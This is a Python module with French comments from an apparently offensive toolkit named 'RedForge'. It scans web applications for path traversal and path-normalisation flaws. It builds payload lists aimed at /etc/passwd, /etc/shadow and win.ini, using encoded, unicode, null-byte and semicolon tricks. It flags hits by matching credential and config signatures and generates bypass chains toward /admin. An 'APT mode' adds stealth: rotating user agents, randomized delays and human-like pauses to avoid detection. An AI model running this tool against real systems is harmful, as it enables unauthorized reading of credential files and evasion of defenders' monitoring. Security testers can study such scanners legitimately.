#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de path normalization pour RedForge
Détection des failles de normalisation de chemins
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class PathNormalizationConfig:
    """Configuration avancée pour la détection de normalisation de chemins"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_depth: int = 10
    test_all_params: bool = True
    test_endpoints: bool = True
    test_encoded_payloads: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_resolution_bypass: bool = True
    test_unicode_normalization: bool = True
    test_relative_paths: bool = True
    max_payloads: int = 50


class PathNormalization:
    """Détection avancée des failles de normalisation de chemins"""
    
    def __init__(self, config: Optional[PathNormalizationConfig] = None):
        """
        Initialise le détecteur de failles de normalisation
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or PathNormalizationConfig()
        
        # Payloads de normalisation
        self.normalization_payloads = self._generate_payloads()
        
        # Endpoints sensibles
        self.sensitive_endpoints = [
            "/admin", "/config", "/backup", "/database", "/sql",
            "/phpmyadmin", "/wp-admin", "/administrator", "/cpanel",
            "/webmin", "/jenkins", "/gitlab", "/console", "/api",
            "/graphql", "/swagger", "/docs", "/health", "/metrics",
            "/debug", "/status", "/info", "/env", "/.git", "/.env"
        ]
        
        # Signatures de succès
        self.success_signatures = {
            "passwd": [r'root:.*:0:0:', r'daemon:.*:1:1:', r'bin:.*:2:2:'],
            "shadow": [r'root:\$.*:\d+:\d+:::'],
            "config": [r'DB_HOST', r'DB_PASSWORD', r'DATABASE_URL', r'define\s*\(\s*[\'"]DB_'],
            "error": [r'failed to open stream', r'No such file', r'cannot find', r'Access denied'],
            "env": [r'PATH=', r'HOME=', r'USER=', r'APP_ENV', r'DATABASE_URL'],
            "git": [r'\[core\]', r'\[remote "origin"\]', r'repositoryformatversion']
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> List[str]:
        """Génère une liste complète de payloads de normalisation"""
        payloads = []
        
        # Basic traversal
        for i in range(1, self.config.max_depth + 1):
            payloads.append("/" + "../" * i + "etc/passwd")
            payloads.append("/" + "../" * i + "etc/shadow")
            payloads.append("/" + "..\\" * i + "windows\\win.ini")
        
        # URL Encoding
        if self.config.test_encoded_payloads:
            encodings = [
                ("%2e%2e%2f", "../"),
                ("%2e%2e\\", "..\\"),
                ("%252e%252e%252f", "../../"),
                ("%2e%2e%2f%2e%2e%2f", "../../"),
                ("%c0%ae%c0%ae%c0%af", "../"),
                ("%c1%9c%c1%9c%c1%9c", "..\\")
            ]
            
            for encoded, decoded in encodings:
                for depth in range(1, 5):
                    payloads.append("/" + (encoded * depth) + "etc/passwd")
        
        # Unicode normalization
        if self.config.test_unicode_normalization:
            unicode_payloads = [
                "/..%c0%af../etc/passwd",
                "/..%c1%9c../etc/passwd",
                "/..%c0%af..%c0%afetc/passwd",
                "/..%ef%bc%8f../etc/passwd",
                "/..%ef%bc%8f..%ef%bc%8fetc/passwd"
            ]
            payloads.extend(unicode_payloads)
        
        # Path resolution tricks
        payloads.extend([
            "/....//....//etc/passwd",
            "/..././..././etc/passwd",
            "/...//...//etc/passwd",
            "/....//....//....//etc/passwd",
            "/..;/..;/..;/etc/passwd",
            "/.;/.;/.;/etc/passwd",
            "/..\\/..\\/etc/passwd",
            "/..\\/..\\/..\\/etc/passwd"
        ])
        
        # Mixed slashes
        payloads.extend([
            "/..\\/..\\/etc/passwd",
            "/..\\/..\\/..\\/etc/passwd",
            "/..\\/../..\\/etc/passwd",
            "/..\\..\\/etc/passwd"
        ])
        
        # Absolute paths
        payloads.extend([
            "//etc/passwd",
            "/\\/etc/passwd",
            "///etc/passwd",
            "////etc/passwd",
            "file:///etc/passwd"
        ])
        
        # Null byte
        for payload in payloads[:10]:
            payloads.append(payload + "%00")
            payloads.append(payload + "\0")
        
        # Space variants
        payloads.extend([
            "/.. /.. /etc/passwd",
            "/..%20/..%20/etc/passwd",
            "/..\t/..\t/etc/passwd"
        ])
        
        # Case variations (Windows)
        payloads.extend([
            "/../..//ETC//passwd",
            "/../..//Windows//win.ini",
            "/..//..//ETC//shadow"
        ])
        
        return list(dict.fromkeys(payloads))[:self.config.max_payloads]
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les failles de normalisation de chemins
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - endpoints: Endpoints à tester
                - depth: Profondeur de test
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test des failles de normalisation de chemins sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Scan discret")
        
        vulnerabilities = []
        
        # Test des paramètres
        param_vulns = self._test_parameters(target, kwargs)
        vulnerabilities.extend(param_vulns)
        
        # Test des endpoints
        if self.config.test_endpoints:
            endpoint_vulns = self._test_endpoints(target, kwargs)
            vulnerabilities.extend(endpoint_vulns)
        
        # Test avancé de résolution de chemins
        if self.config.detect_resolution_bypass:
            resolution_vulns = self._test_path_resolution_bypass(target)
            vulnerabilities.extend(resolution_vulns)
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'depth' in kwargs:
            self.config.max_depth = min(kwargs['depth'], 10)
        if 'test_all_params' in kwargs:
            self.config.test_all_params = kwargs['test_all_params']
        if 'test_endpoints' in kwargs:
            self.config.test_endpoints = kwargs['test_endpoints']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_depth = min(self.config.max_depth, 5)
            self.config.max_payloads = 20
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params and self.config.test_all_params:
            params = self._extract_params(target)
        
        if not params:
            params = ['file', 'path', 'dir', 'page', 'view', 'load', 'include', 
                     'document', 'folder', 'directory', 'filename', 'template']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_parameters(self, target: str, kwargs: Dict) -> List[Dict[str, Any]]:
        """Teste les paramètres pour les failles de normalisation"""
        vulnerabilities = []
        params_to_test = self._get_params_to_test(target, kwargs)
        
        for idx, param in enumerate(params_to_test):
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            for payload in self.normalization_payloads:
                if self.config.random_delays:
                    time.sleep(random.uniform(0.3, 0.8))
                
                result = self._test_normalization_payload(target, param, payload)
                self.payloads_tested += 1
                
                if result['vulnerable']:
                    self.vulnerabilities_found += 1
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "severity": "HIGH",
                        "evidence": result['evidence'],
                        "file_type": result.get('file_type', 'unknown'),
                        "risk_score": 85
                    })
                    print(f"      ✓ Faille de normalisation: {param} -> {payload[:40]}...")
                    break
        
        return vulnerabilities
    
    def _test_normalization_payload(self, target: str, param: str, 
                                     payload: str) -> Dict[str, Any]:
        """Teste un payload de normalisation sur un paramètre"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'file_type': None
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            original_value = query_params[param][0]
            query_params[param] = [original_value + payload]
        else:
            query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Vérifier les signatures
            for sig_type, patterns in self.success_signatures.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['evidence'] = pattern
                        result['file_type'] = sig_type
                        return result
            
            # Détection de chemins dans la réponse
            path_patterns = [
                r'\/etc\/[\w\/]+',
                r'C:\\[\w\\]+',
                r'\/var\/[\w\/]+',
                r'\/home\/[\w\/]+',
                r'\/proc\/[\w\/]+',
                r'\/root\/[\w\/]+'
            ]
            
            for pattern in path_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result['vulnerable'] = True
                    result['evidence'] = 'path_disclosure'
                    return result
            
            # Détection d'erreurs
            error_indicators = [
                'failed to open stream',
                'file_get_contents',
                'No such file',
                'cannot find',
                'Access denied',
                'Permission denied',
                'Unable to open'
            ]
            
            for error in error_indicators:
                if error.lower() in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = error
                    return result
                    
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass
        
        return result
    
    def _test_endpoints(self, target: str, kwargs: Dict) -> List[Dict[str, Any]]:
        """Teste les endpoints pour les failles de normalisation"""
        vulnerabilities = []
        endpoints_to_test = kwargs.get('endpoints', self.sensitive_endpoints)
        
        for idx, endpoint in enumerate(endpoints_to_test):
            if self.config.apt_mode and idx > 5:  # Limiter en mode APT
                break
            
            for payload in self.normalization_payloads[:20]:
                test_url = target.rstrip('/') + endpoint + payload
                
                try:
                    headers = self._get_stealth_headers()
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    
                    for sig_type, patterns in self.success_signatures.items():
                        for pattern in patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self.vulnerabilities_found += 1
                                vulnerabilities.append({
                                    "endpoint": endpoint,
                                    "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                                    "severity": "HIGH",
                                    "evidence": pattern,
                                    "file_type": sig_type,
                                    "risk_score": 85
                                })
                                print(f"      ✓ Normalisation endpoint: {endpoint}")
                                break
                        if vulnerabilities and vulnerabilities[-1]['endpoint'] == endpoint:
                            break
                            
                except Exception:
                    pass
        
        return vulnerabilities
    
    def _test_path_resolution_bypass(self, target: str) -> List[Dict[str, Any]]:
        """
        Teste les bypass de résolution de chemins
        
        Args:
            target: URL cible
        """
        vulnerabilities = []
        
        # Techniques de bypass avancées
        bypass_techniques = [
            # Chemin avec slash redondants
            ("//admin//", "Double slash bypass"),
            ("/./admin/", "Current directory bypass"),
            ("/admin/../admin/", "Self reference bypass"),
            ("/admin%20/", "Space encoding"),
            ("/admin%00/", "Null byte injection"),
            ("/admin/?anything", "Query parameter injection"),
            ("/admin#anything", "Fragment injection"),
            ("/ADMIN/", "Case variation (Windows)"),
            ("/admin/.", "Trailing dot bypass"),
            ("/admin/..;/", "Semicolon bypass")
        ]
        
        for payload, technique in bypass_techniques:
            test_url = target.rstrip('/') + payload
            
            try:
                headers = self._get_stealth_headers()
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Vérifier si on a accédé à une ressource protégée
                if response.status_code == 200:
                    # Vérifier si la réponse ressemble à une page admin
                    admin_indicators = ['admin', 'dashboard', 'settings', 'users', 'config']
                    if any(indicator in response.text.lower() for indicator in admin_indicators):
                        vulnerabilities.append({
                            "technique": technique,
                            "payload": payload,
                            "severity": "MEDIUM",
                            "evidence": "path_resolution_bypass",
                            "risk_score": 70
                        })
                        print(f"      ✓ Bypass de résolution: {technique}")
                        
            except Exception:
                pass
        
        return vulnerabilities
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "max_depth": self.config.max_depth,
                "test_encoded_payloads": self.config.test_encoded_payloads
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune faille de normalisation détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "parameter": len([v for v in vulnerabilities if 'parameter' in v]),
                "endpoint": len([v for v in vulnerabilities if 'endpoint' in v]),
                "bypass": len([v for v in vulnerabilities if 'technique' in v])
            },
            "high": len([v for v in vulnerabilities if v.get('severity') == 'HIGH']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Normaliser les chemins avant validation (realpath, canonicalize)")
            recommendations.add("Utiliser des listes blanches pour les chemins autorisés")
            recommendations.add("Rejeter les chemins contenant des patterns suspects (.., %2e, etc.)")
        
        if any(v.get('evidence') == 'path_disclosure' for v in vulnerabilities):
            recommendations.add("Configurer le serveur pour ne pas divulguer les chemins système")
            recommendations.add("Désactiver l'affichage des erreurs détaillées en production")
        
        if any('bypass' in v for v in vulnerabilities):
            recommendations.add("Utiliser des règles strictes de correspondance de chemins")
            recommendations.add("Implémenter une validation multi-couches")
        
        recommendations.add("Déployer un WAF avec des règles de normalisation")
        recommendations.add("Auditer régulièrement les mécanismes de routage")
        
        return list(recommendations)
    
    def test_path_resolution(self, base_url: str, path: str) -> Dict[str, Any]:
        """
        Teste la résolution de chemin pour détecter les failles
        
        Args:
            base_url: URL de base
            path: Chemin à tester
        """
        result = {
            "original_path": path,
            "resolved_path": None,
            "accessible": False,
            "content_type": None
        }
        
        test_url = base_url.rstrip('/') + path
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            result["accessible"] = response.status_code == 200
            result["status_code"] = response.status_code
            result["content_type"] = response.headers.get('Content-Type', '')
            result["content_length"] = len(response.text)
            
            if 'text/html' in result["content_type"]:
                result["content_preview"] = response.text[:500]
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def generate_bypass_chain(self, target: str, base_path: str) -> List[Dict[str, Any]]:
        """
        Génère une chaîne de bypass pour contourner les protections
        
        Args:
            target: URL cible
            base_path: Chemin de base à atteindre
        """
        bypasses = []
        
        # Techniques de bypass
        techniques = [
            ("URL Encoding", f"/%2e%2e/%2e%2e{base_path}"),
            ("Double Encoding", f"/%252e%252e/%252e%252e{base_path}"),
            ("Unicode", f"/..%c0%af..%c0%af{base_path}"),
            ("Mixed Slashes", f"/..\\/..\\/{base_path}"),
            ("Path Resolution", f"/....//....//{base_path}"),
            ("Absolute Path", f"//{base_path}"),
            ("Backslash", f"/..\\..\\{base_path.replace('/', '\\')}"),
            ("Null Byte", f"{base_path}%00"),
            ("Fragment", f"{base_path}#anything"),
            ("Query Parameter", f"{base_path}?anything="),
            ("Case Variation", base_path.upper() if base_path.islower() else base_path.lower()),
            ("Space Injection", base_path.replace('/', '/%20')),
            ("Semicolon Bypass", base_path.replace('/', '/..;/'))
        ]
        
        for name, payload in techniques:
            test_url = target.rstrip('/') + payload
            bypasses.append({
                "technique": name,
                "url": test_url,
                "payload": payload
            })
        
        return bypasses
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    pn = PathNormalization()
    results = pn.scan("https://example.com/page?file=index")
    print(f"Failles de normalisation: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = PathNormalizationConfig(apt_mode=True, max_depth=5)
    pn_apt = PathNormalization(config=apt_config)
    results_apt = pn_apt.scan("https://example.com/page?file=index", apt_mode=True)
    print(f"Failles de normalisation (APT): {results_apt['count']}")
    
    # Générer bypass chain
    if results_apt['vulnerabilities']:
        bypasses = pn_apt.generate_bypass_chain("https://example.com", "/admin")
        print(f"\nChaînes de bypass générées: {len(bypasses)}")
        for bypass in bypasses[:5]:
            print(f"  - {bypass['technique']}: {bypass['payload']}")